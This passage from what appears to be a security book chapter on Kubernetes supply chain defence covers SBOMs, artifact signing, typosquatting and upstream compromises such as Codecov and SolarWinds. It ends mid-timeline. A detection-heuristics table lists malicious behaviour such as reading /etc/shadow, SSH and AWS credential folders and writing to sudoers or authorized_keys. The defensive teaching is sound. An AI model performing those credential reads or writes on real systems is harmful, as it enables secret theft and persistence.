      </code><code>&lt;</code><code>version&gt;sha256:183257b0183b8c6420f559eb5591885843d30b2</code><code>&lt;</code><code>/version&gt;</code><code> </code><a class="co" id="co_applications_and_supply_chain_CO3-6" href="#callout_applications_and_supply_chain_CO3-6"><img src="Images/6.png" alt="6" width="12" height="12"/></a><code>
    </code><code>&lt;</code><code>/component&gt;</code><code>
  </code><code>&lt;</code><code>/metadata&gt;</code><code>
  </code><code>&lt;</code><code>components&gt;</code><code>&lt;</code><code>/components&gt;</code><code>
</code><code>&lt;</code><code>/bom&gt;</code></pre>
<dl class="calloutlist">
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-1" href="#co_applications_and_supply_chain_CO3-1"><img src="Images/1.png" alt="1" width="12" height="12"/></a></dt>
<dd><p>The vendor of the tool used to create the SBOM.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-2" href="#co_applications_and_supply_chain_CO3-2"><img src="Images/2.png" alt="2" width="12" height="12"/></a></dt>
<dd><p>The tool that’s created the SBOM.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-3" href="#co_applications_and_supply_chain_CO3-3"><img src="Images/3.png" alt="3" width="12" height="12"/></a></dt>
<dd><p>The tool version.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-4" href="#co_applications_and_supply_chain_CO3-4"><img src="Images/4.png" alt="4" width="12" height="12"/></a></dt>
<dd><p>The supply chain component being scanned and its type of container.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-5" href="#co_applications_and_supply_chain_CO3-5"><img src="Images/5.png" alt="5" width="12" height="12"/></a></dt>
<dd><p>The container’s name.</p></dd>
<dt><a class="co" id="callout_applications_and_supply_chain_CO3-6" href="#co_applications_and_supply_chain_CO3-6"><img src="Images/6.png" alt="6" width="12" height="12"/></a></dt>
<dd><p>The container’s version, a SHA256 content hash, or digest.</p></dd>
</dl>

<p>A bill of materials is just a packing list for your software artifacts. Running against the <code>alpine:base</code> image, we see an SBOM with
software licenses<a data-type="indexterm" data-primary="software licenses, SBOMs" id="idm45302814747152"/> (output edited to fit):</p>

<pre data-type="programlisting" data-code-language="bash">user@host:~ <code class="o">[</code>0<code class="o">]</code><code class="nv">$ </code>syft packages alpine:latest -o cyclonedx
 ✔ Loaded image
 ✔ Parsed image
 ✔ Cataloged packages      <code class="o">[</code><code class="m">14</code> packages<code class="o">]</code>
&lt;?xml <code class="nv">version</code><code class="o">=</code><code class="s2">"1.0"</code> <code class="nv">encoding</code><code class="o">=</code><code class="s2">"UTF-8"</code>?&gt;
&lt;bom <code class="nv">xmlns</code><code class="o">=</code><code class="s2">"http://cyclonedx.org/schema/bom/1.2"</code>
     <code class="nv">version</code><code class="o">=</code><code class="s2">"1"</code> <code class="nv">serialNumber</code><code class="o">=</code><code class="s2">"urn:uuid:086e1173-cfeb-4f30-8509-3ba8f8ad9b05"</code>&gt;
  &lt;metadata&gt;
    &lt;timestamp&gt;2021-05-30T19:17:40+01:00&lt;/timestamp&gt;
    &lt;tools&gt;
      &lt;tool&gt;
        &lt;vendor&gt;anchore&lt;/vendor&gt;
        &lt;name&gt;syft&lt;/name&gt;
        &lt;version&gt;0.16.1&lt;/version&gt;
      &lt;/tool&gt;
    &lt;/tools&gt;
    &lt;component <code class="nb">type</code><code class="o">=</code><code class="s2">"container"</code>&gt;
      &lt;name&gt;alpine:latest&lt;/name&gt;
      &lt;version&gt;sha256:d96af464e487874bd504761be3f30a662bcc93be7f70bf&lt;/version&gt;
    &lt;/component&gt;
  &lt;/metadata&gt;
  &lt;components&gt;
  ...
  &lt;component <code class="nb">type</code><code class="o">=</code><code class="s2">"library"</code>&gt;
      &lt;name&gt;musl&lt;/name&gt;
      &lt;version&gt;1.1.24-r9&lt;/version&gt;
      &lt;licenses&gt;
        &lt;license&gt;
          &lt;name&gt;MIT&lt;/name&gt;
        &lt;/license&gt;
      &lt;/licenses&gt;
      &lt;purl&gt;pkg:alpine/musl@1.1.24-r9?arch<code class="o">=</code>x86_64&lt;/purl&gt;
    &lt;/component&gt;
  &lt;/components&gt;
&lt;/bom&gt;</pre>

<p>These verifiable artifacts can be signed by supply chain security tools like <code>cosign</code>, <code>in-toto</code>, and <code>notary</code>. When consumers<a data-type="indexterm" data-primary="cosign" id="idm45302814714832"/><a data-type="indexterm" data-primary="in-toto" id="idm45302814714096"/><a data-type="indexterm" data-primary="notary" id="idm45302814713424"/> demand that suppliers
produce verifiable artifacts and bills of materials from their own audited, compliant, and secure software factories,
the supply chain will become harder to compromise for the casual <a data-type="indexterm" data-primary="SBOMs (Software Bill of Materials)" data-startref="SBOM" id="idm45302814712400"/><a data-type="indexterm" data-primary="Software Bills of Materials (SBOMs)" data-startref="SBOM_n" id="idm45302814711488"/>attacker.</p>
<div data-type="warning" epub:type="warning"><h6>Warning</h6>
<p>An attack on source code prior to building an artifact or generating an SBOM from it is still trusted, even if it is actually malicious,
as with SUNBURST. This is why the build infrastructure must be secured.</p>
</div>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Human Identity and GPG"><div class="sect2" id="idm45302814709088">
<h2>Human Identity and GPG</h2>

<p>Signing Git commits <a data-type="indexterm" data-primary="Git" data-secondary="commits, signing with GPG" id="idm45302814707760"/><a data-type="indexterm" data-primary="GPG (GNU Privacy Guard), signing commits" id="idm45302814706784"/><a data-type="indexterm" data-primary="GNU Privacy Guard (GPG), signing commits" id="idm45302814706016"/>with GNU Privacy Guard (GPG) signatures identifies the owner of they key as having trusted the commit at the time of
signature. This is useful to increase trust, but requires public key infrastructure (PKI), which is <a data-type="indexterm" data-primary="public key infrastructure (PKI)" id="idm45302814704944"/><a data-type="indexterm" data-primary="PKI (public key infrastructure)" id="idm45302814704304"/>notoriously difficult
to secure entirely.</p>
<blockquote>
<p>Signing data is easy—the verification is hard.</p>
<p data-type="attribution">Dan Lorenc</p>
</blockquote>

<p>The problem with PKI is the <a data-type="indexterm" data-primary="security" data-secondary="PKI, problems with" id="idm45302814701456"/>risk of breach of the PKI infrastructure. Somebody is always responsible for ensuring the public key infrastructure
(the servers that host individuals’ trusted public keys) is not compromised and is reporting correct data. If PKI is
compromised, an entire organization may be exploited as attackers add keys they control to trusted users.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Signing Builds and Metadata"><div class="sect1" id="idm45302814699744">
<h1>Signing Builds and Metadata</h1>

<p>In order to trust <a data-type="indexterm" data-primary="builds, signing" data-secondary="overview" id="idm45302814698240"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="overview" id="idm45302814670800"/>the output of your build infrastructure, you need to sign it so consumers can verify that it
came from you. Signing metadata like SBOMs also allows consumers to detect vulnerabilities where the code is deployed
in their systems. The following tools help by signing your artifacts, containers, or metadata.</p>








<section data-type="sect2" class="less_space pagebreak-before" data-pdf-bookmark="Notary v1"><div class="sect2" id="idm45302814669136">
<h2>Notary v1</h2>

<p>Notary is<a data-type="indexterm" data-primary="builds, signing" data-secondary="Notary" id="idm45302814667664"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="Notary" id="idm45302814666656"/><a data-type="indexterm" data-primary="Notary" id="idm45302814665440"/> the signing system built into Docker, and implements The <a data-type="indexterm" data-primary="The Update Framework (TUF)" data-see="TUF (The Update Framework)" id="idm45302814664640"/><a data-type="indexterm" data-primary="TUF (The Update Framework)" id="idm45302814663664"/>Update Framework (TUF).
It’s used for shipping software updates, but wasn’t enabled in Kubernetes as it
requires all images to be signed, or it won’t run them.
<a href="https://oreil.ly/beFeG">portieris</a> implements Notary as an admission
controller for Kubernetes instead.</p>

<p><a href="https://oreil.ly/ZfhGk">Notary v2</a> supports creating multiple signatures for OCI Artifacts and storing them in OCI image registries.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="sigstore"><div class="sect2" id="idm45302814660672">
<h2>sigstore</h2>

<p>sigstore is a<a data-type="indexterm" data-primary="builds, signing" data-secondary="sigstore" id="idm45302814659168"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="sigstore" id="idm45302814658160"/><a data-type="indexterm" data-primary="sigstore" id="idm45302814656944"/> public software signing and transparency service, which can sign containers with <a href="https://oreil.ly/0mtGF">cosign</a> and store the signatures in an OCI repository, something missing from Notary v1. As anything can be stored in
a container (e.g., binaries, tarballs, scripts, or configuration files), <code>cosign</code> is a general artifact signing tool with OCI as its packaging format.</p>
<blockquote>
<p><code>sigstore</code> provides free certificates and tooling to automate and verify signatures of source code.</p>
<p data-type="attribution"><a href="https://oreil.ly/rQEeS">sigstore release announcement</a></p>
</blockquote>

<p>Similar to Certificate Transparency, it has an append-only cryptographic ledger of events (called <a href="https://oreil.ly/hkMGk">rekor</a>),
and each event has signed metadata about a software release as shown in <a data-type="xref" href="#suppy-chain-sigstore">Figure 4-7</a>. Finally, it supports “a free Root-CA for code signing certs, that is, issuing certificates based on an OIDC email address” in <a href="https://oreil.ly/lS8WB">fulcio</a>. Together, these tools dramatically improve the capabilities of the supply chain security landscape.</p>

<p>It is designed for open source software, and is under rapid development. There are integrations for TUF and in-toto, hardware-based tokens are supported, and it’s compatible with most OCI registries.</p>

<p><code>sigstore</code>’s cosign is used to <a href="https://oreil.ly/28hQ9">sign the Distroless base image family</a>.</p>

<figure><div id="suppy-chain-sigstore" class="figure">
<img src="Images/haku_0407.png" alt="Storing sigstore manifests in the sigstore manifests into the rekor transparency log" width="1452" height="2033"/>
<h6><span class="label">Figure 4-7. </span>Storing sigstore manifests in the rekor transparency log</h6>
</div></figure>
</div></section>













<section data-type="sect2" data-pdf-bookmark="in-toto and TUF"><div class="sect2" id="idm45302814645376">
<h2>in-toto and TUF</h2>

<p>The <a href="https://in-toto.io">in-toto toolchain</a> <a data-type="indexterm" data-primary="builds, signing" data-secondary="in-toto" id="idm45302814642928"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="in-toto" id="idm45302814641920"/><a data-type="indexterm" data-primary="pipelines" data-secondary="in-toto" id="idm45302814640704"/><a data-type="indexterm" data-primary="security, pipelines, in-toto" id="idm45302814639760"/><a data-type="indexterm" data-primary="in-toto" id="idm45302814639120"/>checksums and signs software builds—the steps and output of CI/CD<a data-type="indexterm" data-primary="pipelines" data-secondary="CI/CD" id="idm45302814638320"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="CI/CD" id="idm45302814637296"/> pipelines. This provides transparent
metadata about software build processes. This increases the trust a consumer has that an artifact was built from a
specific source code revision.</p>

<p>in-toto link metadata (describing transitions between build stages and signing metadata about them) can be stored by tools like rekor and Grafeas, to be validated by consumers at time of use.</p>

<p>The in-toto signature ensures that a trusted party (e.g., the build server) has built and signed these objects. However, there is no guarantee that the third party’s keys have not been compromised—the only solution for this is to run parallel, isolated build environments and cross-check the cryptographic signatures. This is done with reproducible builds (in Debian, Arch Linux, and PyPi) to offer resilience to build tool compromise.</p>

<p>This is only possible if the CI and builds themselves are deterministic (no side effects of the build) and reproducible
(the same artifacts are created by the source code). Relying on temporal or stochastic behaviors (time and randomness)
will yield unreproducible binaries, as they are affected by timestamps in logfiles, or random seeds that affect
compilation.</p>

<p>When using in-toto, an organization increases trust in their pipelines and artifacts, as there are verifiable signatures
for everything. However, without an objective threat model or security assessment of the original build infrastructure,
this doesn’t protect supply chains with a single build server that may have been compromised.</p>

<p>Producers using in-toto with consumers that verfiy signatures makes an attacker’s life harder. They  must fully
compromise the signing infrastructure (as with SolarWinds).</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="GCP Binary Authorization"><div class="sect2" id="idm45302814632128">
<h2>GCP Binary Authorization</h2>

<p>The GCP Binary Authorization <a data-type="indexterm" data-primary="builds, signing" data-secondary="GCP Binary Authorization" id="idm45302814630832"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="GCP Binary Authorization" id="idm45302814629840"/><a data-type="indexterm" data-primary="GCP Binary Authorization" id="idm45302814628608"/>feature allows signing of images and admission control to prevent unsigned, out of date,
or vulnerable images from reaching production.</p>

<p>Validating expected signatures at runtime provides enforcement of <a data-type="indexterm" data-primary="pipelines" data-secondary="GCP Binary Authorization" id="idm45302814627264"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="GCP Binary Authorization" id="idm45302814626192"/>pipeline controls: is this image free from known
vulnerabilities, or has a list of “accepted” vulnerabilities? Did it pass the automated acceptance tests in the
pipeline? Did it come from the build pipeline at all?</p>

<p>Grafeas is used to store metadata from image scanning reports, and Kritis is an admission controller
that verifies signatures and the absence of CVEs against the images.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Grafeas"><div class="sect2" id="idm45302814623760">
<h2>Grafeas</h2>

<p>Grafeas is a <a data-type="indexterm" data-primary="builds, signing" data-secondary="Grafeas" id="idm45302814622432"/><a data-type="indexterm" data-primary="metadata" data-secondary="signing" data-tertiary="Grafeas" id="idm45302814621424"/><a data-type="indexterm" data-primary="Grafeas" id="idm45302814620208"/>metadata store for <a data-type="indexterm" data-primary="pipelines" data-secondary="Grafeas" id="idm45302814619408"/><a data-type="indexterm" data-primary="security" data-secondary="pipelines" data-tertiary="Grafeas" id="idm45302814618432"/>pipeline metadata like vulnerability scans and test reports. Information about a
container is recorded against its digest, which can be used to report on vulnerabilities of an organization’s images and
ensure that build stages have successfully passed. Grafeas can also store in-toto link metadata.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Infrastructure Supply Chain"><div class="sect1" id="idm45302814616512">
<h1>Infrastructure Supply Chain</h1>

<p>It’s also worth considering<a data-type="indexterm" data-primary="supply chains" data-secondary="infrastructure" data-tertiary="security considerations" id="idm45302814615056"/><a data-type="indexterm" data-primary="infrastructure, supply chains" data-secondary="security considerations" id="idm45302814613808"/> your operating system base image, and the location your Kubernetes control plane containers and packages are installed from.</p>

<p>Some distributions have historically modified and repackaged Kubernetes, and this introduces further supply chain risk of malicious code injection. Decide how you’ll handle this based upon your initial threat model, and architect systems and networks for compromise resilience.</p>








<section data-type="sect2" data-pdf-bookmark="Operator Privileges"><div class="sect2" id="idm45302814611728">
<h2>Operator Privileges</h2>

<p>Kubernetes Operators <a data-type="indexterm" data-primary="supply chains" data-secondary="infrastructure" data-tertiary="Operator privileges" id="idm45302814610496"/><a data-type="indexterm" data-primary="infrastructure, supply chains" data-secondary="Operator privileges" id="idm45302814609216"/><a data-type="indexterm" data-primary="Operator privileges, supply chain attacks" id="idm45302814608256"/><a data-type="indexterm" data-primary="attacks" data-secondary="Operator privileges" id="idm45302814607488"/>are designed to reduce human error by automating Kubernetes configuration, and reactive to events. They
interact with Kubernetes and whatever other resources are under the operator’s control. Those resources may be in a single
namespace, multiple namespaces, or outside of Kubernetes. This means they are often highly privileged to enable this
complex automation, and so bring a level of risk.</p>

<p>An Operator-based supply chain attack might allow Captain Hashjack to discreetly deploy their malicious workloads by
misusing <a data-type="indexterm" data-primary="RBAC (role-based access control)" data-secondary="supply chain attacks" id="idm45302814605472"/><a data-type="indexterm" data-primary="role-based access control (RBAC)" data-see="RBAC (role-based access control)" id="idm45302814604480"/>RBAC, and a rogue resource could go completely undetected. While this attack is not yet widely seen, it has the
potential to compromise a great number of clusters.</p>

<p>You must appraise and security-test third-party Operators<a data-type="indexterm" data-primary="third-party Operators, security considerations" id="idm45302814602816"/> before trusting them: write tests for their RBAC permissions
so you are alerted if they change, and ensure an Operator’s <code>securityContext</code> configuration is suitable for the workload.</p>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Attacking Higher Up the Supply Chain"><div class="sect2" id="idm45302814600992">
<h2>Attacking Higher Up the Supply Chain</h2>

<p>To attack BCTL,<a data-type="indexterm" data-primary="supply chain attacks" data-secondary="upstream suppliers" id="supchnatak_upstream"/> Captain Hashjack may consider attacking the organizations that supply its software, such as operating
systems, vendors, and open source packages. Your open source libraries <a data-type="indexterm" data-primary="open source" data-secondary="libraries, vulnerabilities" id="idm45302814597920"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="open source libraries" id="idm45302814596912"/>may also have vulnerabilities, the most devastating of which has historically been <a data-type="indexterm" data-primary="Struts, attacks on" id="idm45302814595840"/><a data-type="indexterm" data-primary="attacks" data-secondary="Struts" id="idm45302814595168"/>an Apache
Struts RCE, CVE-2017-5638.</p>

<p>Trusted open source libraries may have been “backdoored” (such as NPM’s
<a href="https://oreil.ly/7ZRj5"><code>event-stream</code> package</a>) or may be removed from the registry while in active use, such as <a href="https://oreil.ly/mMv29"><code>left-pad</code></a> (although registries now look to avoid this by preventing “unpublishing” packages).</p>
<div data-type="note" epub:type="note"><h6>Note</h6>
<p>CVE-2017-5638 affected Apache Struts, a Java web framework.</p>

<p>The server didn’t parse <code>Content-Type</code> HTTP headers<a data-type="indexterm" data-primary="Content-Type HTTP headers" data-secondary="vulnerabilities" id="idm45302814589568"/><a data-type="indexterm" data-primary="vulnerabilities" data-secondary="Content-Type HTTP headers" id="idm45302814588496"/><a data-type="indexterm" data-primary="HTTP headers, vulnerabilities" id="idm45302814587536"/> correctly, which <a href="https://oreil.ly/aZfEL">allowed any commands</a> to be executed in the process namespace as the web server’s user.</p>
<blockquote>
  <p>Struts 2 has a history of critical security bugs,[3] many tied to its use of OGNL technology;[4] some vulnerabilities can lead to arbitrary code execution.</p>
  <p data-type="attribution"><a href="https://oreil.ly/t6Cfe">Wikipedia</a></p>
</blockquote>
</div>

<p>Code distributed by vendors can be compromised, as
<a href="https://oreil.ly/9SHDZ">Codecov was</a>. An<a data-type="indexterm" data-primary="Codecov" id="idm45302814582400"/> error
in its container image creation process allowed an attacker to modify a Bash uploader script run by customers to start
builds. This attack compromised build Secrets that may then have been used against other systems.</p>
<div data-type="tip"><h6>Tip</h6>
<p>The number of organizations using Codecov was significant. <a href="https://oreil.ly/kDBdD">Searching for Git repos with grep.app</a> showed there were over 9,200 results in the top 500,000 public Git repos. <a href="https://oreil.ly/GLP8D">GitHub</a> shows 397,518 code results at the time of this writing.</p>
</div>

<p>Poorly written code that fails to handle untrusted user input or internal errors may have remotely exploitable vulnerabilities. Application security is responsible for preventing this easy access to your systems.</p>

<p>The industry-recognised moniker for this<a data-type="indexterm" data-primary="testing" data-secondary="shift-left practices" id="idm45302814577568"/><a data-type="indexterm" data-primary="shift-left security practices" id="idm45302814576592"/> is “shift left,” which means you should run static and dynamic analysis of the code your developers write as they write it: add automated tooling to the IDE, provide a local security testing workflow, run configuration tests before deployment, and generally don’t leave security considerations to the last possible moment as has been traditional in<a data-type="indexterm" data-primary="supply chain attacks" data-secondary="upstream suppliers" data-startref="supchnatak_upstream" id="idm45302814575360"/> software.</p>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Types of Supply Chain Attack"><div class="sect1" id="idm45302814573888">
<h1>Types of Supply Chain Attack</h1>

<p>TAG <a data-type="indexterm" data-primary="TAG Security, Catalog of Supply Chain Compromises" id="idm45302814572256"/><a data-type="indexterm" data-primary="Catalog of Supply Chain Compromises (TAG Security)" id="idm45302814571424"/>Security’s <a href="https://oreil.ly/zwxo9">Catalog of Supply Chain Compromises</a> lists <a data-type="indexterm" data-primary="attacks" data-secondary="supply chains" data-tertiary="types" id="attak_supchn_typ"/><a data-type="indexterm" data-primary="supply chain attacks" data-secondary="types" id="supchnatks_typ"/>attacks affecting packages with millions of weekly downloads across various application dependency repositories and vendors, and hundreds of millions of total 
<span class="keep-together">installations.</span></p>
<blockquote>
  <p>The combined downloads, including both  benign and malicious versions, for the most popular malicious  packages (<code>event-stream</code>—190 million, <code>eslint-scope</code>—442 million, <code>bootstrap-sass</code>—30 million, and <code>rest-client</code>—114 million) sum to 776 million.</p>
  <p data-type="attribution"><a href="https://oreil.ly/uHWBT">“Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages”</a></p>
</blockquote>

<p class="pagebreak-before">In the quoted paper, the authors identify four actors in the <a data-type="indexterm" data-primary="open source" data-secondary="supply chain, actors" id="idm45302814561696"/>open source supply chain:</p>

<ul>
<li>
<p>Registry Maintainers (RMs)</p>
</li>
<li>
<p>Package Maintainers (PMs)</p>
</li>
<li>
<p>Developers (Devs)</p>
</li>
<li>
<p>End-users (Users)</p>
</li>
</ul>

<p>Those with consumers have a responsibility to verify the code they pass to their customers, and a duty to provide verifiable metadata to build confidence in the artifacts.</p>

<p>There’s a lot to defend from to ensure that Users receive a trusted artifact
(<a data-type="xref" href="#table-attack-public-infra">Table 4-4</a>):</p>

<ul>
<li>
<p>Source code</p>
</li>
<li>
<p>Publishing infrastructure</p>
</li>
<li>
<p>Dev tooling</p>
</li>
<li>
<p>Malicious maintainer</p>
</li>
<li>
<p>Negligence</p>
</li>
<li>
<p>Fake toolchain</p>
</li>
<li>
<p>Watering-hole attack</p>
</li>
<li>
<p>Multiple steps</p>
</li>
</ul>

<p>Registry maintainers should guard publishing infrastructure from typosquatters:
individuals that register a package that looks similar to a widely deployed package.</p>
<table id="table-attack-public-infra">
<caption><span class="label">Table 4-4. </span>Examples of attacking publishing infrastructure</caption>
<thead>
<tr>
<th>Attack</th>
<th>Package name</th>
<th>Typosquatted name</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Typosquatting</p></td>
<td><p>event-stream</p></td>
<td><p>eventstream</p></td>
</tr>
<tr>
<td><p>Different account</p></td>
<td><p>user/package</p></td>
<td><p>usr/package, user_/package</p></td>
</tr>
<tr>
<td><p>Combosquatting</p></td>
<td><p>package</p></td>
<td><p>package-2, package-ng</p></td>
</tr>
<tr>
<td><p>Account takeover</p></td>
<td><p>user/package</p></td>
<td><p>user/package—no change as the user has been compromised by to the attacker</p></td>
</tr>
<tr>
<td><p>Social engineering</p></td>
<td><p>user/package</p></td>
<td><p>user/package—no change as the user has willingly given repository access to the attacker</p></td>
</tr>
</tbody>
</table>

<p class="pagebreak-before">As <a data-type="xref" href="#app-trust-supply-chain-paper">Figure 4-8</a> demonstrates, the <a data-type="indexterm" data-primary="attacks" data-secondary="supply chains" data-tertiary="types" data-startref="attak_supchn_typ" id="idm45302814529632"/><a data-type="indexterm" data-primary="supply chain attacks" data-secondary="types" data-startref="supchnatks_typ" id="idm45302814528112"/>supply chain of a <a data-type="indexterm" data-primary="supply chains" data-secondary="package manager risks" id="idm45302814526768"/><a data-type="indexterm" data-primary="package managers, supply chain risks" id="idm45302814525792"/>package manager holds many risks.</p>

<figure><div id="app-trust-supply-chain-paper" class="figure">
<img src="Images/haku_0408.png" alt="Simplified relationships of stakeholders and threats in the package manager ecosystem" width="1414" height="812"/>
<h6><span class="label">Figure 4-8. </span>Simplified relationships of stakeholders and threats in the package manager ecosystem (source: <a href="https://oreil.ly/uHWBT">“Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages”</a>)</h6>
</div></figure>








<section data-type="sect2" data-pdf-bookmark="Open Source Ingestion"><div class="sect2" id="idm45302814521968">
<h2>Open Source Ingestion</h2>

<p>This attention to detail may <a data-type="indexterm" data-primary="packages, hardening" id="pack_hard_chal"/><a data-type="indexterm" data-primary="open source" data-secondary="software" data-tertiary="hardening" id="opso_hard_chal"/>become exhausting when applied to every package and quickly becomes impractical at scale. This is where a web of trust between producers and consumers alleviates some of the burden of double-checking the proofs at every link in the chain. However, nothing can be fully trusted, and regular reverification of code is necessary to account for newly announced CVEs or zero-days.</p>

<p>In “Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages”, the authors identify relevant issues as listed in <a data-type="xref" href="#table-oss-ingestion">Table 4-5</a>.</p>
<table id="table-oss-ingestion" class="less_space pagebreak-before">
<caption><span class="label">Table 4-5. </span>Heuristic rules derived from existing supply chain attacks and other malware studies</caption>
<thead>
<tr>
<th>Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Metadata</p></td>
<td><p>The package name is similar to popular ones in the same registry.
</p><p>The package name is the same as popular packages in other registries, but the authors are different.
</p><p>The package depends on or shares authors with known malware.
</p><p>The package has older versions released around the time as known malware.
</p><p>The package contains Windows PE files or Linux ELF files.</p></td>
</tr>
<tr>
<td><p>Static</p></td>
<td><p>The package has customized installation logic.
</p><p>The package adds network, process, or code generation APIs in recently released versions.
</p><p>The package has flows from filesystem sources to network sinks.
</p><p>The package has flows from network sources to code generation or process sinks.</p></td>
</tr>
<tr>
<td><p>Dynamic</p></td>
<td><p>The package contacts unexpected IPs or domains, where expected ones are official registries and code hosting services.
</p><p>The package reads from sensitive file locations such as <em>/etc/shadow, /home/&lt;user&gt;/.ssh, /home/&lt;user&gt;/.aws</em>.
</p><p>The package writes to sensitive file locations such as <em>/usr/bin, /etc/sudoers, /home/&lt;user&gt;/.ssh/authorized_keys</em>.
</p><p>The package spawns unexpected processes, where expected ones are initialized to registry clients (e.g., pip).</p></td>
</tr>
</tbody>
</table>

<p>The paper summarises that:</p>

<ul>
<li>
<p>Typosquatting and account compromise are low-cost to an attacker, and are the most widely exploited attack vectors.</p>
</li>
<li>
<p>Stealing data and dropping backdoors are the most common malicious post-exploit behaviors, suggesting wide consumer targeting.</p>
</li>
<li>
<p>20% of identified malwares have persisted in package managers for over 400 days and have more than 1K downloads.</p>
</li>
<li>
<p>New techniques include code obfuscation, multistage payloads, and logic bombs to evade detection.</p>
</li>
</ul>

<p>Additionally, packages with lower numbers of installations are unlikely to act quickly on a reported compromise as  <a data-type="xref" href="#app-attacks-persistence-supply-chain">Figure 4-9</a> demonstrates. It could be that the developers are not paid to support these open source packages. Creating incentives for these maintainers with well-written patches and timely assistance merging them, or financial support for handling reports from a bug bounty program, are effective ways to decrease vulnerabilities in popular but rarely maintained <a data-type="indexterm" data-primary="packages, hardening" data-startref="pack_hard_chal" id="idm45302814495936"/><a data-type="indexterm" data-primary="open source" data-secondary="software" data-tertiary="hardening" data-startref="opso_hard_chal" id="idm45302814494992"/>packages.</p>

<figure class="width-80"><div id="app-attacks-persistence-supply-chain" class="figure">
<img src="Images/haku_0409.png" alt="haku 0409" width="831" height="480"/>
<h6><span class="label">Figure 4-9. </span>Correlation between number of persistence days and number of downloads (R&amp;R = Reported and Removed; R&amp;I = Reported and Investigating) (source: <a href="https://oreil.ly/0aNss">“Towards Measuring Supply Chain Attacks on Package Managers for Interpreted Languages”</a>)</h6>
</div></figure>
</div></section>













<section data-type="sect2" data-pdf-bookmark="Application Vulnerability Throughout the SDLC"><div class="sect2" id="idm45302814490032">
<h2>Application Vulnerability Throughout the SDLC</h2>

<p>The Software Development Lifecycle (SDLC) is an<a data-type="indexterm" data-primary="SDLC (Software Development Life Cycle)" data-secondary="risk profile" id="SDLC_risk"/> application’s journey from a glint in a developer’s eye, to its secure
build and deployment on production systems.</p>

<p>As applications progress from development to production they have a varying risk profile, as shown <a data-type="xref" href="#app-dep-vuln-order">Table 4-6</a>.</p>
<table id="app-dep-vuln-order">
<caption><span class="label">Table 4-6. </span>Application vulnerabilities throughout the SDLC</caption>
<thead>
<tr>
<th>System lifecycle stage</th>
<th>Higher risk</th>
<th>Lower risk</th>
</tr>
</thead>
<tbody>
<tr>
<td><p>Development to production deployment</p></td>
<td><p>Application code (changes frequently)</p></td>
<td><p>Application libraries, operating system packages</p></td>
</tr>
<tr>
<td><p>Established production deployment to decommissioning</p></td>
<td><p>Slowly decaying application libraries and operating system packages</p></td>
<td><p>Application code (changes less frequently)</p></td>
</tr>
</tbody>
</table>

<p class="pagebreak-before">The risk profile of an application running in production changes as its lifespan lengthens, as its software becomes
progressively more out-of-date. This is known as “reverse uptime”—the correlation between risk of an application’s
compromise and the time since its deployment (e.g., the date of the container’s build). An average of reverse uptime in
an organization could also be considered “mean time to …”:</p>

<ul>
<li>
<p>Compromise (application has a remotely exploitable vulnerability)</p>
</li>
<li>
<p>Failure (application no longer works with the updated system or external APIs)</p>
</li>
<li>
<p>Update (change application code)</p>
</li>
<li>
<p>Patch (to update dependencies versions explicitly)</p>
</li>
<li>
<p>Rebuild (to pull new server<a data-type="indexterm" data-primary="SDLC (Software Development Life Cycle)" data-secondary="risk profile" data-startref="SDLC_risk" id="idm45302814471392"/> dependencies)</p>
</li>
</ul>
</div></section>





</div></section>













<section data-type="sect1" data-pdf-bookmark="Defending Against SUNBURST"><div class="sect1" id="defending_against_sunburst">
<h1>Defending Against SUNBURST</h1>

<p>So would the techniques in this <a data-type="indexterm" data-primary="SUNBURST" data-secondary="attack timeline" id="SUN_timeline"/><a data-type="indexterm" data-primary="attacks" data-secondary="SUNBURST" data-tertiary="timeline" id="atak_timlin"/>chapter save you from a SUNBURST-like attack? Let’s look at how it worked.</p>

<p>The attackers gained access to the SolarWinds systems on 4th September 2019
(<a data-type="xref" href="#sunspot-timeline">Figure 4-10</a>). This might have happened perhaps through a spear-phishing email
attack that allowed further escalation into SolarWind’s systems or through some
software misconfiguration they found in build infrastructure or internet-facing servers.</p>

<figure><div id="sunspot-timeline" class="figure">
<img src="Images/haku_0410.png" alt="haku 0410" width="1343" height="828"/>
<h6><span class="label">Figure 4-10. </span>SUNSPOT timeline</h6>
</div></figure>

<p>The threat actors stayed hidden for a week, then started testing the
SUNSPOT injection code that would eventually compromise the SolarWinds product. This phase progressed quietly for two months.</p>

<p>Internal detection may have discovered the attackers here, however build infrastructure is rarely subjected to the same
level of security scrutiny, intrusion detection, and monitoring as production systems. This is despite it delivering
code to production or customers. This is something we can address using our more granular security controls around
containers. Of course, a backdoor straight into a host system remains difficult to detect unless intrusion detection is
running on the host, which may be noisy on shared build nodes that necessarily run many jobs for its consumers.</p>

<p>Almost six months after the initial compromise of the build infrastructure, the SUNSPOT malware<a data-type="indexterm" data-primary="SUNSPOT" id="SUNSP"/><a data-type="indexterm" data-primary="malware" data-secondary="SUNSPOT" id="mal_SUNSP"/> was deployed. A month
